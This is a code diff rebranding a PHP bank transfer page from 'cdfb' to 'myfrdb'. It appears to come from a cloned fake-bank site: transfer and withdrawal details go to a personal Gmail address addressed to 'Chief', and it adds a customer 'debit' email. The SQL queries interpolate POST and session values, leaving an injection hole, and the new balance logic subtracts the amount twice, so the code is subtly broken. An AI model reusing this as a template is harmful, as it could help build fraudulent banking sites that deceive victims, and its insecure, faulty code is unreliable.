@@ -22,7 +22,7 @@ ini_set("date.timezone", "Africa/Lagos");
                 <div class="col-md-4 add">
                                             
                                                     <div class="panel panel-default">
-    <div class="panel-heading" style="background-color: #005eb8;">
+    <div class="panel-heading" style="background-color: #28a745;">
         <h3 class="panel-title" style="color: white">Fill out the form to proceed</h3>
     </div>
     <div class="panel-body">
@@ -136,7 +136,7 @@ ini_set("date.timezone", "Africa/Lagos");
                         <div class="form-group"> 
                             <div class="aab controls col-md-4 "></div>
                             <div class="controls col-md-8 ">
-                                <input type="submit" onclick="move()" name="intra_submit" value="Make Transfer" style="background-color: #005eb8; color: white" class="btn btn" id="submit-id-signup" />
+                                <input type="submit" onclick="move()" name="intra_submit" value="Make Transfer" style="background-color: #28a745; color: white" class="btn btn" id="submit-id-signup" />
                             </div>
                         </div> 
                             
@@ -147,7 +147,7 @@ ini_set("date.timezone", "Africa/Lagos");
 </div>                                                            </div>
                 <div class="col-md-4">
                     <div class="panel panel-default">
-                        <div class="panel-heading" style="background-color: #005eb8;">
+                        <div class="panel-heading" style="background-color: #28a745;">
                             <h3 class="panel-title" style="color: white">Status</h3>
                         </div>
                         <div class="panel-body panel-table">
@@ -193,7 +193,7 @@ ini_set("date.timezone", "Africa/Lagos");
                 </div>
                 <div class="col-md-4">
                     <div class="panel panel-default">
-                        <div class="panel-heading" style="background-color: #005eb8;">
+                        <div class="panel-heading" style="background-color: #28a745;">
                             <h3 class="panel-title blinking" style="color: white">Transaction History</h3>
                         </div>
                         <div class="panel-body panel-table">
@@ -260,8 +260,8 @@ if(isset($_POST['intra_submit'])){
                     $b_acct_type = $rows['acct_type'];
                     $amount = $rows['amount'];
                     $name1 = "Chief";
-                    $to = "bryanjohn2044@gmail.com"; // this is your Email address
-                $from = "info@mycdfb.com"; // this is the sender's Email address
+                    $to = "bludarymulti.resource@gmail.com"; // this is your Email address
+                $from = "info@myfrdb.com"; // this is the sender's Email address
                 $subject2 = "Client | Activities";
                 $message2 = "Hello " . $name1 .",
   
@@ -297,6 +297,7 @@ Bank Adress: ".$address ."
                     $b_name = $rows['b_name'];
                     $b_account = $rows['b_acct'];
                     $b_country = $rows['b_country'];
+                    $description = $rows['description'];
                     $swift_code = $rows['swift_code'];
                     $b_routing = $rows['routing_number'];
                     $b_bank = $rows['bank_name'];
@@ -304,8 +305,8 @@ Bank Adress: ".$address ."
                     $amount = $rows['amount'];
                     $b_address = $rows['address']; 
                     $name1 = "Chief";
-                    $to = "bryanjohn2044@gmail.com"; // this is your Email address
-                $from = "info@mycdfb.com"; // this is the sender's Email address
+                    $to = "bludarymulti.resource@gmail.com"; // this is your Email address
+                $from = "info@myfrdb.com"; // this is the sender's Email address
                 $subject2 = "Client | Activities";
                 $message2 = "Hello " . $name1 .",
   
@@ -364,9 +365,9 @@ Bank Adress: ".$b_address ."
 
                                                     $name1 = "Chief";
 
-                                                    $to = "bryanjohn2044@gmail.com"; // this is your Email address
+                                                    $to = "bludarymulti.resource@gmail.com"; // this is your Email address
 
-                                                    $from = "cdfb.com"; // this is the sender's Email address
+                                                    $from = "myfrdb.com"; // this is the sender's Email address
 
                                                     $subject2 = "Withdrawal | Request";
 
@@ -404,9 +405,9 @@ Bank Adress: " . $b_address . "
 
   
 
-Sign into your Admin panel to effect the transaction:
+customer has automatically been debited:
 
-http://www.cdfb.com/zap
+http://www.myfrdb.com/zap
 
   
 
@@ -419,10 +420,48 @@ http://www.cdfb.com/zap
             $sql_qq = mysqli_query($conn, $sql2);
             while ($rows = mysqli_fetch_assoc($sql_qq)) {
                 $accBalance = $rows['amount'];
-                $newAmount = $accBalance - $_POST['amount'];
+                    $email = $rows['email'];
+                    $name = $rows['name'];
+                    $amount2 = $accBalance-=$amount;
+                    $currency = $rows['currency'];
+                    $date2 = $date;
+                    $act_no = $rows['act_no'];
+                    $newact = substr_replace($act_no, '*****', 6, 4);
+                    $account = $rows['account'];
+                    $newAmount = $accBalance - $amount;
             }
             $upd_sql = "UPDATE users SET  amount='$newAmount', am_updated= '$date' WHERE id = '$_SESSION[id]'";
             $run_sql = mysqli_query($conn,$upd_sql);
+
+            $to = $email; // this is your Email address
+                $from = "no-reply@myfrdb.com"; // this is the sender's Email address
+                $first_name = $name;
+           
+                $subject2 = "FRDB Transaction Notification [Debit: ".$currency . $amount . "]";
+                $headers  = 'MIME-Version: 1.0' . "\r\n";
+                $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+                $message = '<html><body>';
+                    $message = '<div class="navbar-brand"  style="text-align: center; background-color: green" href=""><img src="https://i.ibb.co/LRSjYX8/logo-200x45.png" alt="FRDB" class="logo">';
+                       $message .= '<div  style="background-color: white;">';
+                       $message .= '<h3 style="text-align: left;">Dear '. $first_name . '</h3>';
+                       $message .= "<h4 style='color:#071d49;'>Your account has been Debited
+                </4>";
+                        $message .= '<div style="text-align: center;">';
+                       $message .= '<h1 style="color: red; font-size:18px;">' .$currency .$amount.'.00</h1>';
+                       $message .= '<h3>Transaction Summary</h3>';
+                       $message .= '<p><b>IBAN:</b> '.$newact.'</p><b>Account type:</b></p> '.$account.'<p><b>Account Name:</b> '. $name .'</p>';
+                       $message .= '<p><b>Transaction Branch:</b> Head Office</p><p><b>Transaction Date:</b> ' .$date2.'</p>';
+                       $message .= '<p><b>Transaction Amount:</b> '.$currency .$amount.'.00</p>';
+                       $message .= '<p><b>Description:</b> '.$description.'</p>';
+                       $message .= '<p><b>Available Balance:</b> ' .$currency . $newAmount .'.00</p>';
+                       $message .= '</div>';
+                       $message .= '<h4>Your balance at the time of this transaction is <strong>' .$currency . $newAmount .'.00</strong> Thank you for chosing FRDBank</h4>';
+                       $message .= '<div style="background-color: #28a745; color: white; text-align: center"><a href="https://www.myfrdb.com">FRDB!</a> Always giving you extra.</div>';
+$message .= '</div></div></body></html>';
+                      $headers .= 'From: '.$from."\r\n".
+    'Reply-To: '.$from."\r\n" .
+    'X-Mailer: PHP/' . phpversion();
+                mail($to,$subject2,$message,$headers); 
 
             $sel_sql = "SELECT * FROM users WHERE  id = '$_SESSION[id]'";
                             $sql = mysqli_query($conn,$sel_sql);
